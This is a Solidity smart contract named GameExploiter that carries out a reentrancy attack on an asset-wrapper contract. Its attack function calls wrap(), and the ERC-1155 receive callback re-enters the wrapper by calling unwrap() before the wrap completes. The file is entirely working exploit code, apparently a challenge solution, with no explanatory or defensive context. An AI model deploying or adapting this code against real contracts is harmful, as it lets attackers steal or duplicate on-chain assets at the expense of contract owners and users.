//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IAssetWrapper {
    function wrap(uint256, address, address) external;
    function unwrap(address, address) external;
}

contract GameExploiter {
    IAssetWrapper wrapper;
    address assetAddress;

    constructor(address _wrapperAddress) {
        wrapper = IAssetWrapper(_wrapperAddress);
    }

    function attack(address _assetAddress) public {
        assetAddress = _assetAddress;
        wrapper.wrap(0, address(this), assetAddress);
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 amount, bytes calldata data)
        external
        returns (bytes4)
    {
        wrapper.unwrap(address(this), assetAddress);

        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }
}
